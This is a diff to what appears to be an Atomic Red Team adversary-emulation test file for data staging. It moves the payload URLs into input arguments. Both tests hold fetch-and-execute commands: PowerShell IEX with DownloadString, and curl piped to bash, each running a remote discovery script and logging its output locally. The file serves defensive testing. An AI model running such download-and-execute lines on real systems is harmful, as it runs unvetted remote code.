@@ -10,10 +10,15 @@ atomic_tests:
   supported_platforms:
     - windows
 
+  input_arguments:
+    payload_bat_file: URL of the payload .BAT file
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat
+
   executor:
     name: powershell
     command: |
-      "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')" > c:\windows\pi.log
+      "IEX (New-Object Net.WebClient).DownloadString('#{payload_bat_file}')" > c:\windows\pi.log
 
 - name: Stage data from Discovery.sh
   description: |
@@ -22,8 +27,13 @@ atomic_tests:
   supported_platforms:
     - linux
     - macos
+    
+  input_arguments:
+    payload_sh_file: URL of the payload .sh file
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
 
   executor:
     name: bash
     command: |
-      curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh | bash -s > /tmp/discovery.log
+      curl -s #{payload_sh_file} | bash -s > /tmp/discovery.log
